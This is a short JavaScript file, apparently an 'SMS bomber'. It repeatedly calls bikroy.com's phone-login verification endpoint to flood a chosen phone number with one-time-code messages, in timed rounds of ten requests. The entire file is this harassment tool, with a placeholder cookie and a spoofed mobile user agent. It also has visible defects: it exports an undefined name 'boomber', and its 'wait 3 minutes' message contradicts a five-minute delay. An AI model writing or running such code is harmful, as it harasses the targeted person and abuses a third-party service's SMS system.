async function bikroy(number, limit) {
  for (let round = 0; round < limit; round++) {
    console.log(`▶ Round ${round + 1}/${limit} started`);

    for (let i = 0; i < 10; i++) {
      try {
        const response = await axios.get('https://bikroy.com/data/phone_number_login/verifications/phone_login', {
          params: { phone: number },
          headers: {
            'authority': 'bikroy.com',
            'accept': 'application/json, text/plain, */*',
            'accept-language': 'bn',
            'application-name': 'web',
            'cookie': 'your_cookie_here',
            'referer': 'https://bikroy.com/bn?login-modal=true&redirect-url=/bn',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
          }
        });

        console.log(`[${i + 1}/10] Sent to ${number} | Response:`, response.data);
      } catch (error) {
        console.error(`[${i + 1}/10] Failed:`, error.message);
      }

      await new Promise(resolve => setTimeout(resolve, 3000));
    }

    if (round < limit - 1) {
      console.log(`⏳ Waiting 3 minutes before next round...`);
      await new Promise(resolve => setTimeout(resolve, 300000));
    }
  }

  console.log("✅ All rounds completed.");
    }

module.exports = { boomber };
